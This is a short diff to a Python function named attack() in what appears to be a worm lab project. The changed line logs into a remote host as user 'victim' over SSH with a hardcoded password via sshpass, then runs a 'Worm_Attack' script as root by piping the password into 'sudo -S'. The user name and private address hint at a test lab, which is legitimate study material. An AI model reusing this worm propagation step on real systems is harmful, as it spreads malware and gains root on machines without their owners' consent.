@@ -40,7 +40,7 @@ def attack():
 
     # Run the worm
     # command = 'cd /home/{0}/Worm_Attack && (sudo ./run.sh )'
-    os.system('sshpass -p victim ssh -t victim@192.168.31.145 -p 5555 \"cd /home/victim/Worm_Attack && (sudo ./run.sh )\"')
+    os.system('sshpass -p victim ssh -t victim@192.168.31.145 -p 5555 \"cd /home/victim/Worm_Attack && (echo victim | sudo -S ./run.sh )\"')
     # ssh_command_using_ssh_key(command)
 
 
